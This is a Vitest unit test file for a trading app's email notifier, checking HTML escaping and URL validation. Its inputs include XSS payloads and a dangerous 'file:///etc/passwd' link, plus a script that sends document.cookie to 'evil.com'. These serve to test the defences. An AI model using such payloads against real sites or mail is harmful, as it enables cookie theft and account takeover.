/**
 * Unit tests for EmailSender.
 *
 * CRITICAL: Tests HTML escaping and URL validation to prevent XSS and injection attacks.
 * Email notifications contain user-generated content (trade reasons, ticker symbols, etc.)
 * that must be sanitized before rendering in HTML emails.
 */

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { EmailSender } from '../../src/notifications/email.js';
import type { NotificationPayload } from '@sentinel/shared';

describe('EmailSender', () => {
  const originalEnv = {
    RESEND_API_KEY: process.env.RESEND_API_KEY,
    NOTIFICATION_EMAIL: process.env.NOTIFICATION_EMAIL,
  };

  beforeEach(() => {
    vi.restoreAllMocks();
  });

  afterEach(() => {
    process.env.RESEND_API_KEY = originalEnv.RESEND_API_KEY;
    process.env.NOTIFICATION_EMAIL = originalEnv.NOTIFICATION_EMAIL;
  });

  describe('configuration', () => {
    it('is not configured when RESEND_API_KEY is missing', () => {
      delete process.env.RESEND_API_KEY;
      process.env.NOTIFICATION_EMAIL = 'user@example.com';

      const sender = new EmailSender();
      expect(sender.isConfigured).toBe(false);
    });

    it('is not configured when NOTIFICATION_EMAIL is missing', () => {
      process.env.RESEND_API_KEY = 'test-key';
      delete process.env.NOTIFICATION_EMAIL;

      const sender = new EmailSender();
      expect(sender.isConfigured).toBe(false);
    });

    it('is configured when both env vars are set', () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'user@example.com';

      const sender = new EmailSender();
      expect(sender.isConfigured).toBe(true);
    });
  });

  describe('send - basic functionality', () => {
    it('does nothing when not configured', async () => {
      delete process.env.RESEND_API_KEY;
      delete process.env.NOTIFICATION_EMAIL;

      const fetchMock = vi.fn();
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'Test',
        body: 'Test body',
      };

      await sender.send(payload);

      expect(fetchMock).not.toHaveBeenCalled();
    });

    it('sends email to Resend API when configured', async () => {
      process.env.RESEND_API_KEY = 'test-key-123';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'warning',
        title: 'High Volatility Alert',
        body: 'AAPL volatility above 3%',
      };

      await sender.send(payload);

      expect(fetchMock).toHaveBeenCalledOnce();
      expect(fetchMock).toHaveBeenCalledWith(
        'https://api.resend.com/emails',
        expect.objectContaining({
          method: 'POST',
          headers: {
            Authorization: 'Bearer test-key-123',
            'Content-Type': 'application/json',
          },
        }),
      );

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      expect(body.to).toBe('trader@example.com');
      expect(body.subject).toBe('[Sentinel] High Volatility Alert');
      expect(body.html).toContain('High Volatility Alert');
      expect(body.html).toContain('AAPL volatility above 3%');
    });

    it('includes severity color in HTML email', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValue(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();

      // Test all severity levels
      const severities: Array<{ severity: 'info' | 'warning' | 'critical'; color: string }> = [
        { severity: 'info', color: '#3b82f6' },
        { severity: 'warning', color: '#f59e0b' },
        { severity: 'critical', color: '#ef4444' },
      ];

      for (const { severity, color } of severities) {
        fetchMock.mockClear();
        await sender.send({ severity, title: 'Test', body: 'Test body' });

        const body = JSON.parse(fetchMock.mock.calls[0][1].body);
        expect(body.html).toContain(`border-left: 4px solid ${color}`);
      }
    });

    it('does not throw when Resend API fails', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ error: 'rate limit exceeded' }), { status: 429 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'Test',
        body: 'Test body',
      };

      // Should not throw
      await expect(sender.send(payload)).resolves.toBeUndefined();
    });

    it('does not throw when fetch throws network error', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockRejectedValueOnce(new Error('Network error'));
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'Test',
        body: 'Test body',
      };

      // Should not throw
      await expect(sender.send(payload)).resolves.toBeUndefined();
    });
  });

  describe('HTML escaping - XSS prevention', () => {
    it('escapes < > in title to prevent XSS', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: '<script>alert("XSS")</script>',
        body: 'Test body',
      };

      await sender.send(payload);

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      expect(body.html).not.toContain('<script>');
      expect(body.html).toContain('&lt;script&gt;');
      expect(body.html).toContain('&lt;/script&gt;');
    });

    it('escapes < > in body to prevent XSS', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'Trade Alert',
        body: 'Reason: <img src=x onerror=alert(1)>',
      };

      await sender.send(payload);

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      expect(body.html).not.toContain('<img');
      expect(body.html).toContain('&lt;img');
      expect(body.html).toContain('&gt;');
    });

    it('escapes ampersands to prevent entity injection', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'P&L Report',
        body: 'Profit & Loss: $1000',
      };

      await sender.send(payload);

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      expect(body.html).toContain('P&amp;L Report');
      expect(body.html).toContain('Profit &amp; Loss');
    });

    it('escapes quotes to prevent attribute injection', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'Alert: "Critical"',
        body: "User said: 'Buy now'",
      };

      await sender.send(payload);

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      expect(body.html).toContain('&quot;Critical&quot;');
      expect(body.html).toContain('&#39;Buy now&#39;');
    });

    it('escapes complex XSS payloads', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'warning',
        title: '"><script>fetch("http://evil.com?cookie="+document.cookie)</script>',
        body: '<iframe src="javascript:alert(1)"></iframe>',
      };

      await sender.send(payload);

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      // Verify no executable code remains
      expect(body.html).not.toContain('<script>');
      expect(body.html).not.toContain('<iframe');
      expect(body.html).not.toContain('javascript:');
      // Verify escaping happened
      expect(body.html).toContain('&lt;script&gt;');
      expect(body.html).toContain('&lt;iframe');
    });
  });

  describe('URL validation - injection prevention', () => {
    it('includes action link when actionUrl is HTTPS', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'Test',
        body: 'Test body',
        actionUrl: 'https://sentinel.example/recommendations/123',
      };

      await sender.send(payload);

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      expect(body.html).toContain('href="https://sentinel.example/recommendations/123"');
      expect(body.html).toContain('View in Dashboard');
    });

    it('includes action link when actionUrl is HTTP', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'Test',
        body: 'Test body',
        actionUrl: 'http://localhost:3000/dashboard',
      };

      await sender.send(payload);

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      expect(body.html).toContain('href="http://localhost:3000/dashboard"');
    });

    it('rejects javascript: protocol URLs', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'Test',
        body: 'Test body',
        actionUrl: 'javascript:alert(1)',
      };

      await sender.send(payload);

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      expect(body.html).not.toContain('href="javascript:');
      expect(body.html).not.toContain('View in Dashboard');
    });

    it('rejects data: protocol URLs', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'Test',
        body: 'Test body',
        actionUrl: 'data:text/html,<script>alert(1)</script>',
      };

      await sender.send(payload);

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      expect(body.html).not.toContain('href="data:');
      expect(body.html).not.toContain('View in Dashboard');
    });

    it('rejects file: protocol URLs', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'Test',
        body: 'Test body',
        actionUrl: 'file:///etc/passwd',
      };

      await sender.send(payload);

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      expect(body.html).not.toContain('href="file:');
      expect(body.html).not.toContain('View in Dashboard');
    });

    it('rejects malformed URLs', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'Test',
        body: 'Test body',
        actionUrl: 'not a valid url',
      };

      await sender.send(payload);

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      expect(body.html).not.toContain('href="not a valid url"');
      expect(body.html).not.toContain('View in Dashboard');
    });

    it('omits action link when actionUrl is undefined', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'Test',
        body: 'Test body',
      };

      await sender.send(payload);

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      expect(body.html).not.toContain('View in Dashboard');
      expect(body.html).not.toContain('<a href');
    });

    it('escapes actionUrl to prevent attribute injection', async () => {
      process.env.RESEND_API_KEY = 'test-key';
      process.env.NOTIFICATION_EMAIL = 'trader@example.com';

      const fetchMock = vi.fn().mockResolvedValueOnce(
        new Response(JSON.stringify({ id: 'email-123' }), { status: 200 }),
      );
      vi.stubGlobal('fetch', fetchMock);

      const sender = new EmailSender();
      const payload: NotificationPayload = {
        severity: 'info',
        title: 'Test',
        body: 'Test body',
        actionUrl: 'https://example.com/page?param=<script>alert(1)</script>',
      };

      await sender.send(payload);

      const body = JSON.parse(fetchMock.mock.calls[0][1].body);
      // URL should be escaped in the href attribute
      expect(body.html).not.toContain('<script>');
      expect(body.html).toContain('&lt;script&gt;');
    });
  });
});
